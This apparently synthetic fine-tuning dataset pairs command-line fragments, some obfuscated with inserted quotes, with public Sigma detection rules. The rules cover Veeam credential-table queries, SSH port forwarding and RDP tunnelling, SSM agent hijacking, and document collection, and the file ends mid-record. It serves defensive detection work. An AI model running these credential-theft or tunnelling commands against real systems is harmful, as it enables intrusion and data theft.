{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlcmd.exe VeeamBackup From BackupRepositories Backups Credentials HostCreds SmbFileShares Ssh_creds VSphereInfo", "output": "title: Veeam Backup Database Suspicious Query\nid: 696bfb54-227e-4602-ac5b-30d9d2053312\nstatus: test\ndescription: Detects potentially suspicious SQL queries using SQLCmd targeting the Veeam backup databases in order to steal information.\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-04\ntags:\n    - attack.collection\n    - attack.t1005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sql:\n        Image|endswith: '\\sqlcmd.exe'\n        CommandLine|contains|all:\n            - 'VeeamBackup'\n            - 'From '\n    selection_db:\n        CommandLine|contains:\n            - 'BackupRepositories'\n            - 'Backups'\n            - 'Credentials'\n            - 'HostCreds'\n            - 'SmbFileShares'\n            - 'Ssh_creds'\n            - 'VSphereInfo'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlcmd.exe VeeamBackup From BackupRepositories Backups Credentials HostCreds SmbFileShares Ssh_\"creds\" VSphereInfo", "output": "title: Veeam Backup Database Suspicious Query\nid: 696bfb54-227e-4602-ac5b-30d9d2053312\nstatus: test\ndescription: Detects potentially suspicious SQL queries using SQLCmd targeting the Veeam backup databases in order to steal information.\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-04\ntags:\n    - attack.collection\n    - attack.t1005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sql:\n        Image|endswith: '\\sqlcmd.exe'\n        CommandLine|contains|all:\n            - 'VeeamBackup'\n            - 'From '\n    selection_db:\n        CommandLine|contains:\n            - 'BackupRepositories'\n            - 'Backups'\n            - 'Credentials'\n            - 'HostCreds'\n            - 'SmbFileShares'\n            - 'Ssh_creds'\n            - 'VSphereInfo'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlcmd VeeamBackup From BackupRepositories Backups Credentials HostCreds SmbFileShares Ssh_creds VSphereInfo", "output": "title: Veeam Backup Database Suspicious Query\nid: 696bfb54-227e-4602-ac5b-30d9d2053312\nstatus: test\ndescription: Detects potentially suspicious SQL queries using SQLCmd targeting the Veeam backup databases in order to steal information.\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-04\ntags:\n    - attack.collection\n    - attack.t1005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sql:\n        Image|endswith: '\\sqlcmd.exe'\n        CommandLine|contains|all:\n            - 'VeeamBackup'\n            - 'From '\n    selection_db:\n        CommandLine|contains:\n            - 'BackupRepositories'\n            - 'Backups'\n            - 'Credentials'\n            - 'HostCreds'\n            - 'SmbFileShares'\n            - 'Ssh_creds'\n            - 'VSphereInfo'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlcmd.exe VeeamBackup From BackupRepositories Backups Credentials HostCreds SmbFileShares Ssh_creds VSphereInfo", "output": "title: Veeam Backup Database Suspicious Query\nid: 696bfb54-227e-4602-ac5b-30d9d2053312\nstatus: test\ndescription: Detects potentially suspicious SQL queries using SQLCmd targeting the Veeam backup databases in order to steal information.\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-04\ntags:\n    - attack.collection\n    - attack.t1005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sql:\n        Image|endswith: '\\sqlcmd.exe'\n        CommandLine|contains|all:\n            - 'VeeamBackup'\n            - 'From '\n    selection_db:\n        CommandLine|contains:\n            - 'BackupRepositories'\n            - 'Backups'\n            - 'Credentials'\n            - 'HostCreds'\n            - 'SmbFileShares'\n            - 'Ssh_creds'\n            - 'VSphereInfo'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ssh.exe -R", "output": "title: Port Forwarding Activity Via SSH.EXE\nid: 327f48c1-a6db-4eb8-875a-f6981f1b0183\nstatus: test\ndescription: Detects port forwarding activity via SSH.exe\nreferences:\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-12\nmodified: 2024-03-05\ntags:\n    - attack.command-and-control\n    - attack.lateral-movement\n    - attack.t1572\n    - attack.t1021.001\n    - attack.t1021.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ssh.exe'\n        CommandLine|contains|windash: ' -R '\n    condition: selection\nfalsepositives:\n    - Administrative activity using a remote port forwarding to a local port\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ssh.exe \"-\"\"R\"", "output": "title: Port Forwarding Activity Via SSH.EXE\nid: 327f48c1-a6db-4eb8-875a-f6981f1b0183\nstatus: test\ndescription: Detects port forwarding activity via SSH.exe\nreferences:\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-12\nmodified: 2024-03-05\ntags:\n    - attack.command-and-control\n    - attack.lateral-movement\n    - attack.t1572\n    - attack.t1021.001\n    - attack.t1021.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ssh.exe'\n        CommandLine|contains|windash: ' -R '\n    condition: selection\nfalsepositives:\n    - Administrative activity using a remote port forwarding to a local port\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ssh -R", "output": "title: Port Forwarding Activity Via SSH.EXE\nid: 327f48c1-a6db-4eb8-875a-f6981f1b0183\nstatus: test\ndescription: Detects port forwarding activity via SSH.exe\nreferences:\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-12\nmodified: 2024-03-05\ntags:\n    - attack.command-and-control\n    - attack.lateral-movement\n    - attack.t1572\n    - attack.t1021.001\n    - attack.t1021.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ssh.exe'\n        CommandLine|contains|windash: ' -R '\n    condition: selection\nfalsepositives:\n    - Administrative activity using a remote port forwarding to a local port\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ssh.exe -R", "output": "title: Port Forwarding Activity Via SSH.EXE\nid: 327f48c1-a6db-4eb8-875a-f6981f1b0183\nstatus: test\ndescription: Detects port forwarding activity via SSH.exe\nreferences:\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-12\nmodified: 2024-03-05\ntags:\n    - attack.command-and-control\n    - attack.lateral-movement\n    - attack.t1572\n    - attack.t1021.001\n    - attack.t1021.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ssh.exe'\n        CommandLine|contains|windash: ' -R '\n    condition: selection\nfalsepositives:\n    - Administrative activity using a remote port forwarding to a local port\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ssh.exe :3389", "output": "title: Potential RDP Tunneling Via SSH\nid: f7d7ebd5-a016-46e2-9c54-f9932f2d386d\nrelated:\n    - id: f38ce0b9-5e97-4b47-a211-7dc8d8b871da # plink.exe\n      type: similar\nstatus: test\ndescription: Execution of ssh.exe to perform data exfiltration and tunneling through RDP\nreferences:\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-12\nmodified: 2023-01-25\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ssh.exe'\n        CommandLine|contains: ':3389'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"s\"\"s\"\"h\"\".\"\"e\"\"x\"\"e\" :3389", "output": "title: Potential RDP Tunneling Via SSH\nid: f7d7ebd5-a016-46e2-9c54-f9932f2d386d\nrelated:\n    - id: f38ce0b9-5e97-4b47-a211-7dc8d8b871da # plink.exe\n      type: similar\nstatus: test\ndescription: Execution of ssh.exe to perform data exfiltration and tunneling through RDP\nreferences:\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-12\nmodified: 2023-01-25\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ssh.exe'\n        CommandLine|contains: ':3389'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ssh :3389", "output": "title: Potential RDP Tunneling Via SSH\nid: f7d7ebd5-a016-46e2-9c54-f9932f2d386d\nrelated:\n    - id: f38ce0b9-5e97-4b47-a211-7dc8d8b871da # plink.exe\n      type: similar\nstatus: test\ndescription: Execution of ssh.exe to perform data exfiltration and tunneling through RDP\nreferences:\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-12\nmodified: 2023-01-25\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ssh.exe'\n        CommandLine|contains: ':3389'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ssh.exe :3389", "output": "title: Potential RDP Tunneling Via SSH\nid: f7d7ebd5-a016-46e2-9c54-f9932f2d386d\nrelated:\n    - id: f38ce0b9-5e97-4b47-a211-7dc8d8b871da # plink.exe\n      type: similar\nstatus: test\ndescription: Execution of ssh.exe to perform data exfiltration and tunneling through RDP\nreferences:\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-12\nmodified: 2023-01-25\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ssh.exe'\n        CommandLine|contains: ':3389'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\amazon-ssm-agent.exe -register -code -id -region", "output": "title: Potential Amazon SSM Agent Hijacking\nid: d20ee2f4-822c-4827-9e15-41500b1fff10\nstatus: test\ndescription: Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.\nreferences:\n    - https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan\n    - https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/\n    - https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/\nauthor: Muhammad Faisal\ndate: 2023-08-02\ntags:\n    - attack.command-and-control\n    - attack.persistence\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\amazon-ssm-agent.exe'\n        CommandLine|contains|all:\n            - '-register '\n            - '-code '\n            - '-id '\n            - '-region '\n    condition: selection\nfalsepositives:\n    - Legitimate activity of system administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\amazon-ssm-agent.exe \\\"-reg\\\"ister -code -id -region", "output": "title: Potential Amazon SSM Agent Hijacking\nid: d20ee2f4-822c-4827-9e15-41500b1fff10\nstatus: test\ndescription: Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.\nreferences:\n    - https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan\n    - https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/\n    - https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/\nauthor: Muhammad Faisal\ndate: 2023-08-02\ntags:\n    - attack.command-and-control\n    - attack.persistence\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\amazon-ssm-agent.exe'\n        CommandLine|contains|all:\n            - '-register '\n            - '-code '\n            - '-id '\n            - '-region '\n    condition: selection\nfalsepositives:\n    - Legitimate activity of system administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\amazon-ssm-agent -register -code -id -region", "output": "title: Potential Amazon SSM Agent Hijacking\nid: d20ee2f4-822c-4827-9e15-41500b1fff10\nstatus: test\ndescription: Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.\nreferences:\n    - https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan\n    - https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/\n    - https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/\nauthor: Muhammad Faisal\ndate: 2023-08-02\ntags:\n    - attack.command-and-control\n    - attack.persistence\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\amazon-ssm-agent.exe'\n        CommandLine|contains|all:\n            - '-register '\n            - '-code '\n            - '-id '\n            - '-region '\n    condition: selection\nfalsepositives:\n    - Legitimate activity of system administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\amazon-ssm-agent.exe -code -register -region -id", "output": "title: Potential Amazon SSM Agent Hijacking\nid: d20ee2f4-822c-4827-9e15-41500b1fff10\nstatus: test\ndescription: Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.\nreferences:\n    - https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan\n    - https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/\n    - https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/\nauthor: Muhammad Faisal\ndate: 2023-08-02\ntags:\n    - attack.command-and-control\n    - attack.persistence\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\amazon-ssm-agent.exe'\n        CommandLine|contains|all:\n            - '-register '\n            - '-code '\n            - '-id '\n            - '-region '\n    condition: selection\nfalsepositives:\n    - Legitimate activity of system administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ntvdm.exe \\csrstub.exe", "output": "title: Start of NT Virtual DOS Machine\nid: 16905e21-66ee-42fe-b256-1318ada2d770\nstatus: test\ndescription: Ntvdm.exe allows the execution of 16-bit Windows applications on 32-bit Windows operating systems, as well as the execution of both 16-bit and 32-bit DOS applications\nreferences:\n    - https://learn.microsoft.com/en-us/windows/compatibility/ntvdm-and-16-bit-app-support\n    - https://support.microsoft.com/fr-fr/topic/an-ms-dos-based-program-that-uses-the-ms-dos-protected-mode-interface-crashes-on-a-computer-that-is-running-windows-7-5dc739ea-987b-b458-15e4-d28d5cca63c7\n    - https://app.any.run/tasks/93fe92fa-8b2b-4d92-8c09-a841aed2e793/\n    - https://app.any.run/tasks/214094a7-0abc-4a7b-a564-1b757faed79d/\nauthor: frack113\ndate: 2022-07-16\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\ntvdm.exe'\n            - '\\csrstub.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ntvdm.exe \"\\\"\"c\"\"s\"\"r\"\"s\"\"t\"\"u\"\"b\"\".\"\"e\"\"x\"\"e\"", "output": "title: Start of NT Virtual DOS Machine\nid: 16905e21-66ee-42fe-b256-1318ada2d770\nstatus: test\ndescription: Ntvdm.exe allows the execution of 16-bit Windows applications on 32-bit Windows operating systems, as well as the execution of both 16-bit and 32-bit DOS applications\nreferences:\n    - https://learn.microsoft.com/en-us/windows/compatibility/ntvdm-and-16-bit-app-support\n    - https://support.microsoft.com/fr-fr/topic/an-ms-dos-based-program-that-uses-the-ms-dos-protected-mode-interface-crashes-on-a-computer-that-is-running-windows-7-5dc739ea-987b-b458-15e4-d28d5cca63c7\n    - https://app.any.run/tasks/93fe92fa-8b2b-4d92-8c09-a841aed2e793/\n    - https://app.any.run/tasks/214094a7-0abc-4a7b-a564-1b757faed79d/\nauthor: frack113\ndate: 2022-07-16\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\ntvdm.exe'\n            - '\\csrstub.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ntvdm \\csrstub", "output": "title: Start of NT Virtual DOS Machine\nid: 16905e21-66ee-42fe-b256-1318ada2d770\nstatus: test\ndescription: Ntvdm.exe allows the execution of 16-bit Windows applications on 32-bit Windows operating systems, as well as the execution of both 16-bit and 32-bit DOS applications\nreferences:\n    - https://learn.microsoft.com/en-us/windows/compatibility/ntvdm-and-16-bit-app-support\n    - https://support.microsoft.com/fr-fr/topic/an-ms-dos-based-program-that-uses-the-ms-dos-protected-mode-interface-crashes-on-a-computer-that-is-running-windows-7-5dc739ea-987b-b458-15e4-d28d5cca63c7\n    - https://app.any.run/tasks/93fe92fa-8b2b-4d92-8c09-a841aed2e793/\n    - https://app.any.run/tasks/214094a7-0abc-4a7b-a564-1b757faed79d/\nauthor: frack113\ndate: 2022-07-16\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\ntvdm.exe'\n            - '\\csrstub.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ntvdm.exe \\csrstub.exe", "output": "title: Start of NT Virtual DOS Machine\nid: 16905e21-66ee-42fe-b256-1318ada2d770\nstatus: test\ndescription: Ntvdm.exe allows the execution of 16-bit Windows applications on 32-bit Windows operating systems, as well as the execution of both 16-bit and 32-bit DOS applications\nreferences:\n    - https://learn.microsoft.com/en-us/windows/compatibility/ntvdm-and-16-bit-app-support\n    - https://support.microsoft.com/fr-fr/topic/an-ms-dos-based-program-that-uses-the-ms-dos-protected-mode-interface-crashes-on-a-computer-that-is-running-windows-7-5dc739ea-987b-b458-15e4-d28d5cca63c7\n    - https://app.any.run/tasks/93fe92fa-8b2b-4d92-8c09-a841aed2e793/\n    - https://app.any.run/tasks/214094a7-0abc-4a7b-a564-1b757faed79d/\nauthor: frack113\ndate: 2022-07-16\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\ntvdm.exe'\n            - '\\csrstub.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".SettingContent-ms immersivecontrolpanel", "output": "title: Arbitrary Shell Command Execution Via Settingcontent-Ms\nid: 24de4f3b-804c-4165-b442-5a06a2302c7e\nstatus: test\ndescription: The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create \"shortcuts\" to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries.\nreferences:\n    - https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39\nauthor: Sreeman\ndate: 2020-03-13\nmodified: 2022-04-14\ntags:\n    - attack.t1204\n    - attack.t1566.001\n    - attack.execution\n    - attack.initial-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '.SettingContent-ms'\n    filter:\n        CommandLine|contains: 'immersivecontrolpanel'\n    condition: selection and not filter\nfields:\n    - ParentProcess\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".SettingContent-ms \\\"immersivecontrolpanel\\\"", "output": "title: Arbitrary Shell Command Execution Via Settingcontent-Ms\nid: 24de4f3b-804c-4165-b442-5a06a2302c7e\nstatus: test\ndescription: The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create \"shortcuts\" to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries.\nreferences:\n    - https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39\nauthor: Sreeman\ndate: 2020-03-13\nmodified: 2022-04-14\ntags:\n    - attack.t1204\n    - attack.t1566.001\n    - attack.execution\n    - attack.initial-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '.SettingContent-ms'\n    filter:\n        CommandLine|contains: 'immersivecontrolpanel'\n    condition: selection and not filter\nfields:\n    - ParentProcess\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".SettingContent-ms immersivecontrolpanel", "output": "title: Arbitrary Shell Command Execution Via Settingcontent-Ms\nid: 24de4f3b-804c-4165-b442-5a06a2302c7e\nstatus: test\ndescription: The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create \"shortcuts\" to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries.\nreferences:\n    - https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39\nauthor: Sreeman\ndate: 2020-03-13\nmodified: 2022-04-14\ntags:\n    - attack.t1204\n    - attack.t1566.001\n    - attack.execution\n    - attack.initial-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '.SettingContent-ms'\n    filter:\n        CommandLine|contains: 'immersivecontrolpanel'\n    condition: selection and not filter\nfields:\n    - ParentProcess\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Winrar.exe \\7zFM.exe \\peazip.exe \\isoburn.exe \\PowerISO.exe \\ImgBurn.exe", "output": "title: Phishing Pattern ISO in Archive\nid: fcdf69e5-a3d3-452a-9724-26f2308bf2b1\nstatus: test\ndescription: Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web)\nreferences:\n    - https://twitter.com/1ZRR4H/status/1534259727059787783\n    - https://app.any.run/tasks/e1fe6a62-bce8-4323-a49a-63795d9afd5d/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-06-07\ntags:\n    - attack.initial-access\n    - attack.t1566\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\Winrar.exe'\n            - '\\7zFM.exe'\n            - '\\peazip.exe'\n        Image|endswith:\n            - '\\isoburn.exe'\n            - '\\PowerISO.exe'\n            - '\\ImgBurn.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate cases in which archives contain ISO or IMG files and the user opens the archive and the image via clicking and not extraction\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Winrar.exe \\7zFM.exe \\peazip.exe \\isoburn.exe \\PowerISO.exe \"\\ImgBurn.exe\"", "output": "title: Phishing Pattern ISO in Archive\nid: fcdf69e5-a3d3-452a-9724-26f2308bf2b1\nstatus: test\ndescription: Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web)\nreferences:\n    - https://twitter.com/1ZRR4H/status/1534259727059787783\n    - https://app.any.run/tasks/e1fe6a62-bce8-4323-a49a-63795d9afd5d/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-06-07\ntags:\n    - attack.initial-access\n    - attack.t1566\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\Winrar.exe'\n            - '\\7zFM.exe'\n            - '\\peazip.exe'\n        Image|endswith:\n            - '\\isoburn.exe'\n            - '\\PowerISO.exe'\n            - '\\ImgBurn.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate cases in which archives contain ISO or IMG files and the user opens the archive and the image via clicking and not extraction\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Winrar \\7zFM \\peazip \\isoburn \\PowerISO \\ImgBurn", "output": "title: Phishing Pattern ISO in Archive\nid: fcdf69e5-a3d3-452a-9724-26f2308bf2b1\nstatus: test\ndescription: Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web)\nreferences:\n    - https://twitter.com/1ZRR4H/status/1534259727059787783\n    - https://app.any.run/tasks/e1fe6a62-bce8-4323-a49a-63795d9afd5d/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-06-07\ntags:\n    - attack.initial-access\n    - attack.t1566\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\Winrar.exe'\n            - '\\7zFM.exe'\n            - '\\peazip.exe'\n        Image|endswith:\n            - '\\isoburn.exe'\n            - '\\PowerISO.exe'\n            - '\\ImgBurn.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate cases in which archives contain ISO or IMG files and the user opens the archive and the image via clicking and not extraction\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Winrar.exe \\peazip.exe \\isoburn.exe \\7zFM.exe \\PowerISO.exe \\ImgBurn.exe", "output": "title: Phishing Pattern ISO in Archive\nid: fcdf69e5-a3d3-452a-9724-26f2308bf2b1\nstatus: test\ndescription: Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web)\nreferences:\n    - https://twitter.com/1ZRR4H/status/1534259727059787783\n    - https://app.any.run/tasks/e1fe6a62-bce8-4323-a49a-63795d9afd5d/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-06-07\ntags:\n    - attack.initial-access\n    - attack.t1566\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\Winrar.exe'\n            - '\\7zFM.exe'\n            - '\\peazip.exe'\n        Image|endswith:\n            - '\\isoburn.exe'\n            - '\\PowerISO.exe'\n            - '\\ImgBurn.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate cases in which archives contain ISO or IMG files and the user opens the archive and the image via clicking and not extraction\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".doc .docx .xls .xlsx .ppt .pptx .rtf .pdf .txt dir /b /s FINDSTR.EXE /e /si", "output": "title: Automated Collection Command Prompt\nid: f576a613-2392-4067-9d1a-9345fb58d8d1\nstatus: test\ndescription: Once established within a system or network, an adversary may use automated techniques for collecting internal data.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1119/T1119.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md\nauthor: frack113\ndate: 2021-07-28\nmodified: 2022-11-11\ntags:\n    - attack.collection\n    - attack.t1119\n    - attack.credential-access\n    - attack.t1552.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ext:\n        CommandLine|contains:\n            - '.doc'\n            - '.docx'\n            - '.xls'\n            - '.xlsx'\n            - '.ppt'\n            - '.pptx'\n            - '.rtf'\n            - '.pdf'\n            - '.txt'\n    selection_other_dir:\n        CommandLine|contains|all:\n            - 'dir '\n            - ' /b '\n            - ' /s '\n    selection_other_findstr:\n        OriginalFileName: 'FINDSTR.EXE'\n        CommandLine|contains:\n            - ' /e '\n            - ' /si '\n    condition: selection_ext and 1 of selection_other_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".doc .docx .xls .xlsx .ppt .pptx \".rtf\" \".pdf\" .txt dir /b /s FINDSTR.EXE /e /si", "output": "title: Automated Collection Command Prompt\nid: f576a613-2392-4067-9d1a-9345fb58d8d1\nstatus: test\ndescription: Once established within a system or network, an adversary may use automated techniques for collecting internal data.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1119/T1119.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md\nauthor: frack113\ndate: 2021-07-28\nmodified: 2022-11-11\ntags:\n    - attack.collection\n    - attack.t1119\n    - attack.credential-access\n    - attack.t1552.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ext:\n        CommandLine|contains:\n            - '.doc'\n            - '.docx'\n            - '.xls'\n            - '.xlsx'\n            - '.ppt'\n            - '.pptx'\n            - '.rtf'\n            - '.pdf'\n            - '.txt'\n    selection_other_dir:\n        